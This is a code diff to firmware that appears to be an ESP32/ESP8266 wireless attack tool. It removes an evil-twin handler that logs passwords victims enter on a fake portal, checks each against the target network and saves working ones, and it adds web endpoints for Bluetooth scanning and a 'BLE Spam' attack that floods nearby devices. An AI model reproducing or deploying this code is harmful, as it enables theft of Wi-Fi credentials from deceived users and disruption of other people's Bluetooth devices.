@@ -33,6 +33,7 @@
 #include "CLI.h"
 #include "Attack.h"
 #include "Scan.h"
+#include "BLEScanner.h"
 
 extern bool progmemToSpiffs(const char* adr, int len, String path);
 
@@ -41,6 +42,7 @@ extern bool progmemToSpiffs(const char* adr, int len, String path);
 extern Scan   scan;
 extern CLI    cli;
 extern Attack attack;
+extern BLEScanner bleScanner;
 
 #ifndef ESP32
 typedef enum wifi_mode_t {
@@ -515,77 +517,38 @@ namespace wifi {
             server.send(200, str(W_JSON), attack.getStatusJSON());
         });
 
-        server.on("/logpwd", HTTP_POST, []() {
-            String password = server.arg("pwd");
-            String clientIP = server.client().remoteIP().toString();
-            
-            File logFile = FILE_SYSTEM.open("/etwin_log.txt", "a");
-            if (logFile) {
-                logFile.print("[");
-                logFile.print(millis());
-                logFile.print("] IP: ");
-                logFile.print(clientIP);
-                logFile.print(" | Password: ");
-                logFile.print(password);
-                
-                if (attack.isEvilTwinRunning()) {
-                    String targetSSID = attack.getEvilTwinTargetSSID();
-                    if (targetSSID.length() > 0) {
-                        logFile.print(" | Target: ");
-                        logFile.print(targetSSID);
-                        logFile.print(" | Validating...");
-                        
-                        Serial.print("=== VALIDATING PASSWORD ===");
-                        Serial.print("Target: " + targetSSID);
-                        Serial.print(" | Password: " + password);
-                        Serial.print(" | Trying...");
-                        
-                        WiFi.mode(WIFI_STA);
-                        WiFi.disconnect();
-                        delay(100);
-                        WiFi.begin((char*)targetSSID.c_str(), (char*)password.c_str());
-                        
-                        int waitCount = 0;
-                        bool connected = false;
-                        while (waitCount < 20) {
-                            if (WiFi.status() == WL_CONNECTED) {
-                                connected = true;
-                                break;
-                            }
-                            delay(500);
-                            waitCount++;
-                        }
-                        
-                        if (connected) {
-                            logFile.print(" [VALID!]");
-                            Serial.println(" VALID!");
-                            File validFile = FILE_SYSTEM.open("/valid_pass.txt", "a");
-                            if (validFile) {
-                                validFile.print("[");
-                                validFile.print(millis());
-                                validFile.print("] SSID: ");
-                                validFile.print(targetSSID);
-                                validFile.print(" | Password: ");
-                                validFile.println(password);
-                                validFile.close();
-                            }
-                            WiFi.disconnect();
-                        } else {
-                            logFile.print(" [INVALID]");
-                            Serial.println(" INVALID");
-                            WiFi.disconnect();
-                        }
-                    }
-                }
-                
-                logFile.println();
-                logFile.close();
-                
-                Serial.println("=========================");
-            }
-            
-            server.send(200, str(W_TXT), "OK");
+        #ifdef ESP32
+        server.on("/blescan.json", HTTP_GET, []() {
+            server.send(200, str(W_JSON), bleScanner.getDevicesJSON());
         });
+
+        server.on("/blescan_start", HTTP_GET, []() {
+            String dur = server.arg("duration");
+            int duration = dur.length() > 0 ? dur.toInt() : 5000;
+            bleScanner.start(duration);
+            server.send(200, str(W_TXT), "BLE Scan started for " + String(duration) + "ms");
+        });
+
+        server.on("/blescan_stop", HTTP_GET, []() {
+            bleScanner.stop();
+            server.send(200, str(W_TXT), "BLE Scan stopped");
+        });
+
+        server.on("/blescan_clear", HTTP_GET, []() {
+            bleScanner.clear();
+            server.send(200, str(W_TXT), "BLE Scan cleared");
+        });
+
+        server.on("/blespam_start", HTTP_GET, []() {
+            attack.startBleSpam(20);
+            server.send(200, str(W_TXT), "BLE Spam started!");
+        });
+
+        server.on("/blespam_stop", HTTP_GET, []() {
+            attack.stop();
+            server.send(200, str(W_TXT), "BLE Spam stopped!");
+        });
+        #endif
 
         server.on("/etwin.html", HTTP_GET, []() {
             if (FILE_SYSTEM.exists("/web/etwin.html")) {
